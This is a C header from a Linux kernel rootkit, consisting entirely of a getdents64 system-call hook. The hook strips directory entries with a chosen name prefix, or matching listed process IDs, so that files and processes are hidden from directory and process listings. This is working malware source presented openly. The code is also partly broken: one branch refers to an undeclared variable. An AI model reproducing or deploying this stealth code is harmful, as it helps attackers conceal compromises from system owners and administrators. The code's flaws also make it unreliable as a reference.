#include <linux/dirent.h>

#include "syscall_table_fetch.h"
#include "rootkit_utils.h"

#ifndef SYSCALL_GETDENTS64_HOOK_H
#define SYSCALL_GETDENTS64_HOOK_H

#ifdef PTREGS_SYSCALL_STUBS
static tt_syscall original_getdents64;
#else
typedef asmlinkage long (*tt_syscall_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
static tt_syscall_getdents64 original_getdents64;
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int getdents64_hook(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;
    long error;
    int ret = original_getdents64(regs);

    dirent_ker = (struct linux_dirent64*) kzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL)) {
        return ret;
    }
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error) {
        kfree(dirent_ker);
        return ret;
    }
    while (offset < ret) {
        current_dir = (void *) dirent_ker + offset;
        if (memcmp(DIRECTORY_EXCLUSION_PREFIX, current_dir->d_name, strlen(DIRECTORY_EXCLUSION_PREFIX)) == 0) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            struct linked_list_node *node;
            int found = 0;
            list_for_each_entry(node, &excluded_pids, list) {
                if (memcmp((char *) node->data, current_dir->d_name, strlen((char *) node->data)) == 0) {
                    found = 1;
                    break;
                }
            }
            if (found) {
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *) current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
              previous_dir = current_dir;
            }
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error) {
        kfree(dirent_ker);
        return ret;
    }
    kfree(dirent_ker);
    return ret;
}
#else
static asmlinkage int getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;
    long error;
    int ret = original_getdents64(fd, dirp, count);

    dirent_ker = (struct linux_dirent64*) kzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL)) {
        return ret;
    }
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error) {
        kfree(dirent_ker);
        return ret;
    }
    while (offset < ret) {
        current_dir = (void *) dirent_ker + offset;
        if (memcmp(DIRECTORY_EXCLUSION_PREFIX, current_dir->d_name, strlen(DIRECTORY_EXCLUSION_PREFIX)) == 0) {
            if(current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            struct linked_list_node *node;
            int found = 0;
            list_for_each_entry(node, &excluded_pids, list) {
                if (memcmp((char *) node->data, current_dir->d_name, strlen((char *) node->data)) == 0) {
                    found = 1;
                    break;
                }
            }
            if (found) {
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *) current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
              previous_dir = current_dir;
            }
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error) {
        kfree(dirent_ker);
        return ret;
    }
    kfree(dirent_ker);
    return ret;
}
#endif


#endif